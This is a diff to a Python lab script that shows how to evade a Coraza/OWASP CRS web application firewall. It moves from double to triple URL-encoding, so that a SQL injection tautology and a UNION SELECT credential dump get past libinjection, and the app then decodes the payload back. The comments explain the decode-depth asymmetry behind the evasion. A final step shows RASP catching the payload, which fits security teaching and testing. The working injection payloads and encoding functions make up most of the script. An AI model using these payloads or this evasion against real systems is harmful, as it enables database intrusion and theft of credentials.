@@ -1,25 +1,38 @@
 #!/usr/bin/env python3
-"""Cardinal — DOUBLE / ALTERNATE-ENCODING WAF evasion (reference sqli-reference.pdf
+"""Cardinal — ALTERNATE / MULTI-ENCODING WAF evasion (reference sqli-reference.pdf
 §3, row 1: "Alternate / mismatched encodings").
 
-The idea: encode a payload so the WAF sees it STILL ENCODED (no keyword to match)
-while the app decodes it back into the real attack.
+The idea: encode a payload so the WAF sees it STILL ENCODED (no SQL to match)
+while the app decodes it back into the real attack. The classic phrasing is
+"double-URL-encoding", but the real requirement is a *decode-depth asymmetry*:
 
-Why a second decode is needed on THIS stack: Werkzeug already percent-decodes the
-query string ONCE, so a double-encoded %2527 reaches the app as %27 — still inert.
-The webapp's ?decode=double toggle applies ONE more unquote (%27 -> '), modelling
-the very common double-decoding app/middleware and re-forming the payload the WAF
-never saw. The toggle keeps the demo honest: without that extra decode the payload
-is inert at the app too, so there would be no real bypass to show.
+    the app must decode one layer MORE than the WAF normalizes.
+
+Why double-encoding does NOT work on this stack (verified against the live lab):
+Coraza + OWASP CRS normalizes TWO encoding layers before matching (it decodes the
+argument once when parsing, then again via the CRS `t:urlDecodeUni` transform). So
+a DOUBLE-encoded payload is fully decoded by the WAF and caught by libinjection
+(rule 942100, "SQL Injection Attack Detected via libinjection"). The webapp also
+decodes twice at decode=double (Werkzeug once + one extra unquote) -> same depth as
+the WAF -> no asymmetry -> blocked.
+
+A TRIPLE-encoded payload survives the WAF's two decodes as still-encoded %XX (no
+keyword, no quote) and sails past, while the app's decode=triple (Werkzeug once +
+TWO extra unquotes) peels all three layers and re-forms the real attack. That one
+extra decode is the whole evasion.
+
+We percent-encode EVERY byte (not just quotes/spaces) so even literal keywords like
+UNION/SELECT stay hidden from the WAF after its two decodes -- otherwise the
+alphabetic keywords survive and CRS still flags them.
 
 Ports (proxy/etc/caddy/Caddyfile):
   :80    enforcing WAF  (Coraza + OWASP CRS)  -> blocks
   :8080  detection-only -> logs to /shared/waf_audit.log, forwards
 
-This walks a payload from plain -> single-encoded -> double-encoded and prints
-what each actually did. It does NOT assume the outcome: whether CRS's own
-double-encoding rule (the 920xxx "URL Encoding Abuse" family) catches step C/D is
-an empirical result — read it off the walk and /shared/waf_audit.log.
+This walks a payload plain -> single -> double -> triple and prints what each
+actually did. It does NOT assume the outcome -- read the matched CRS rule ids off
+/shared/waf_audit.log (expect 942100 on the plain/single/double attempts, and
+nothing on the triple one that slips past).
 
 Run on the attacker node:  /scripts/encoding_evasion.sh   (wraps this)
                      or:    python3 /scripts/encoding_evasion.py
@@ -37,12 +50,16 @@ BOOL = "' OR '1'='1"
 UNION = "zzz' UNION SELECT id,username,password,title,department,bio,status FROM users-- -"
 
 
-def enc1(s):   # single URL-encode (every byte)
-    return urllib.parse.quote(s, safe="")
+def enc1(s):   # single-encode EVERY byte, so keyword letters are hidden too
+    return "".join("%%%02X" % b for b in s.encode())
 
 
-def enc2(s):   # double URL-encode: re-encode the percent signs (%27 -> %2527)
+def enc2(s):   # double-encode: re-escape the percent signs (%27 -> %2527)
     return enc1(s).replace("%", "%25")
+
+
+def enc3(s):   # triple-encode: one more layer (the depth that out-decodes the WAF)
+    return enc2(s).replace("%", "%25")
 
 
 def plain(s):  # minimal: only spaces encoded, so keywords/quotes stay literal
@@ -90,28 +107,28 @@ def main():
     print("=" * 74)
     print("BOOLEAN tautology   ' OR '1'='1   (concat path returns ALL rows if it fires)")
     print("=" * 74)
-    step("A. plain            @ :80  (keyword in cleartext)", ENFORCE, plain(BOOL))
-    step("B. single-encoded   @ :80  (WAF decodes once -> sees it)", ENFORCE, enc1(BOOL))
-    step("C. double-encoded   @ :80, decode=single (app: 1 decode)", ENFORCE, enc2(BOOL), "&decode=single")
-    step("D. double-encoded   @ :80, decode=double (app: 2 decodes)", ENFORCE, enc2(BOOL), "&decode=double")
-    print("     Reading C/D: if D is INJECTED, the bypass worked — the WAF saw only")
-    print("     %27.. (no keyword) and passed, and the app's 2nd decode re-formed the")
-    print("     quote. If C/D are BLOCKED, CRS's double-encoding rule caught the %25 —")
-    print("     note the rule id in /shared/waf_audit.log.")
-    step("E. double-encoded   @ :8080 detection, decode=double", DETECT, enc2(BOOL), "&decode=double")
+    step("A. plain            @ :80  (SQL in cleartext)", ENFORCE, plain(BOOL))
+    step("B. single-encoded   @ :80, decode=single (WAF: 2 decodes)", ENFORCE, enc1(BOOL), "&decode=single")
+    step("C. double-encoded   @ :80, decode=double (app 2 == WAF 2)", ENFORCE, enc2(BOOL), "&decode=double")
+    step("D. TRIPLE-encoded   @ :80, decode=triple (app 3  > WAF 2)", ENFORCE, enc3(BOOL), "&decode=triple")
+    print("     A/B/C are caught by libinjection (942100): the WAF decodes TWO layers,")
+    print("     so even the double-encoded payload is fully revealed to it. D is the")
+    print("     bypass -- the WAF's two decodes leave it as %XX (no SQL), and the app's")
+    print("     THIRD decode re-forms the quote. Confirm the rule ids in waf_audit.log.")
+    step("E. TRIPLE-encoded   @ :8080 detection, decode=triple (baseline)", DETECT, enc3(BOOL), "&decode=triple")
 
     print()
     print("=" * 74)
     print("UNION creds dump    (look for 'alicepw' in the response)")
     print("=" * 74)
     step("A. plain            @ :80", ENFORCE, plain(UNION), leak="alicepw")
-    step("D. double-encoded   @ :80, decode=double", ENFORCE, enc2(UNION), "&decode=double", leak="alicepw")
+    step("D. TRIPLE-encoded   @ :80, decode=triple", ENFORCE, enc3(UNION), "&decode=triple", leak="alicepw")
 
     print()
     print("=" * 74)
     print("COMPOSITION — RASP catches the payload that beat the WAF")
     print("=" * 74)
-    step("F. double-encoded   @ :80, decode=double, rasp=block", ENFORCE, enc2(BOOL), "&decode=double&rasp=block")
+    step("F. TRIPLE-encoded   @ :80, decode=triple, rasp=block", ENFORCE, enc3(BOOL), "&decode=triple&rasp=block")
     print("     RASP inspects the FINAL, decoded query at the DB call (reference §2.4),")
     print("     so the encoding trick that blinds the WAF does not help against it.")
 
